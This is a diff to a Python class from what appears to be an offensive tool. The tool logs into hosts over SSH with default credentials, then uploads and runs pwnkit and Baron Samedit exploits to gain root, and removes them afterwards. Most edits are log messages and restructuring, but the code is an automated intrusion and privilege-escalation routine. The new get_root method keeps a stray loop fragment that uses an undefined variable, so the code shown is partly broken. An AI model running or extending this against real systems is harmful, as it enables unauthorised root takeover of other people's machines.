@@ -3,6 +3,7 @@ from BetterLogger import logger
 
 COLOR_OKGREEN = '\033[92m'
 COLOR_OKBLUE = '\033[94m'
+COLOR_ORANGE = '\033[93m'
 COLOR_FAIL = '\033[91m'
 COLOR_END = '\033[0m'
 
@@ -25,26 +26,32 @@ class UserIP:
 		"""
 		try:
 			got_root = False
-			logger.info(f"Connecting to {username}@{self.ip_address}...")
+			logger.info(f"Logging in as `{username}` over SSH...")
 			ssh_client = paramiko.SSHClient()
 			ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 			ssh_client.connect(self.ip_address, username=username, password=password, timeout=5)
-			logger.info(f"{COLOR_OKGREEN}Successfully connected to {username}@{self.ip_address}{COLOR_END}")
+			logger.info(f"{COLOR_ORANGE}Successfully logged in as `{username}`.{COLOR_END}")
 		except paramiko.AuthenticationException as err:
-			logger.info(f"{COLOR_FAIL}Failed to connect to {username}@{self.ip_address}. The user most likely changed their password!{COLOR_END}")
+			logger.info(f"{COLOR_FAIL}Failed to log in as `{username}`. The user most likely changed their password!{COLOR_END}")
 			return False
 		except Exception as err:
-			logger.info(f"{COLOR_FAIL}Failed to connect to {username}@{self.ip_address}{COLOR_END}")
+			logger.info(f"{COLOR_FAIL}Failed to log in as `{username}`{COLOR_END}")
 			return False
 
 		if is_sudo_user:
-			got_root = True
-		elif exploit_pwnkit: # only attempt to exploit pwnkit if we're not already a sudo user
+			ssh_client.close()
+			logger.info(f"{COLOR_OKGREEN}This user has sudo access so we don't even need to try exploits!{COLOR_END}")
+			return True
+
+		logger.info(f"Attempting to get root using unpatched privilege escalation CVEs...")
+		if not got_root and exploit_pwnkit: # only attempt to exploit pwnkit if we're not already a sudo user
 			got_root = self.exploit_pwnkit(ssh_client=ssh_client, username=username)
-		elif exploit_baron_samedit:
+		if not got_root and exploit_baron_samedit:
 			got_root = self.exploit_baron_samedit(ssh_client=ssh_client, username=username)
 
 		ssh_client.close()
+		if not got_root:
+			logger.info(f"{COLOR_FAIL}Failed to get root using unpatched privilege escalation CVEs.{COLOR_END}")
 		return got_root
 
 	def exploit_pwnkit(self, ssh_client, username):
@@ -52,6 +59,7 @@ class UserIP:
 		Exploits pwnkit over an existing SSH connection
 		"""
 		try:
+			logger.info("Attempting to exploit the pwnkit vulnerability...")
 			logger.info("Copying pwnkit_x64 binary over SSH...")
 			sftp = ssh_client.open_sftp()
 			pwnkit_binary_name = "pwnkit_x64"
@@ -105,15 +113,15 @@ class UserIP:
 			ssh_stderr_text = ssh_stderr.read().decode().strip()
 			if ssh_stderr_text != "":
 				logger.error(ssh_stderr_text)
-			logger.info("Successfully cleaned up up pwnkit binary.")
+			logger.info("Successfully cleaned up the pwnkit binary.")
 
 			ssh_client.close()
 
 			if output_as_string == "root":
-				logger.info(f"{COLOR_OKGREEN}Successfully got root on {username}@{self.ip_address}{COLOR_END}")
+				logger.info(f"{COLOR_OKGREEN}Successfully got root via the user `{username}` using pwnkit.{COLOR_END}")
 				return True
 			else:
-				logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable to pwnkit{COLOR_END}")
+				logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable to pwnkit.{COLOR_END}")
 				return False
 		except Exception as err:
 			logger.exception(err)
@@ -124,6 +132,7 @@ class UserIP:
 		Exploits baron samedit over an existing SSH connection
 		"""
 		try:
+			logger.info("Attempting to exploit the Baron Samedit vulnerability...")
 			logger.info("Copying baron_samedit.py over SSH...")
 			sftp = ssh_client.open_sftp()
 			baron_samedit_script = "baron_samedit.py"
@@ -170,27 +179,43 @@ class UserIP:
 			ssh_stderr_text = ssh_stderr.read().decode().strip()
 			if ssh_stderr_text != "":
 				logger.error(ssh_stderr_text)
-			logger.info("Successfully cleaned up up baron_samedit script.")
+			logger.info("Successfully cleaned up the baron_samedit script.")
 
 			ssh_client.close()
 
 			if output_as_string == "root":
-				logger.info(f"{COLOR_OKGREEN}Successfully got root on {username}@{self.ip_address}{COLOR_END}")
+				logger.info(f"{COLOR_OKGREEN}Successfully got root via the user `{username}` using Baron Samedit.{COLOR_END}")
 				return True
 			else:
-				logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable to pwnkit{COLOR_END}")
+				logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable to Baron Samedit.{COLOR_END}")
 				return False
 		except Exception as err:
 			logger.exception(err)
 			return False
 
-	def check_all_logins(self, return_when_root=True):
+
+	def check_all_logins(self):
 		"""
 		Tries to connect using all default credentials
 
 		return_when_root: If set to False, all logins will be checked regardless of whether or not we successfully got root
 		"""
+		logger.info("====== ATTEMPTING TO GET ROOT WITH DEFAULT CREDENTIALS OVER SSH =========")
+		got_root = False
 		for credential in self.credentials:
+			got_root_with_credentials = self.__check_login(username=credential["username"], password=credential["password"], is_sudo_user=credential["sudo_user"])
+			if got_root_with_credentials:
+				got_root = True
+				break
+		return got_root
+
+	def get_root(self):
+		"""
+		Tries all exploits in an attempt to get root
+		"""
+		got_root = False
+		if not got_root:
+			got_root = self.check_all_logins()
 			try:
 				got_root = self.__check_login(username=credential["username"], password=credential["password"], is_sudo_user=credential["sudo_user"])
 				if got_root:
@@ -199,3 +224,8 @@ class UserIP:
 						break
 			except Exception as err:
 				pass
+
+		if got_root:
+			logger.info(f"{COLOR_OKBLUE}Successfully got root on {self.ip_address}{COLOR_END}")
+		else:
+			logger.info(f"{COLOR_FAIL}Failed to get root on {self.ip_address}{COLOR_END}")
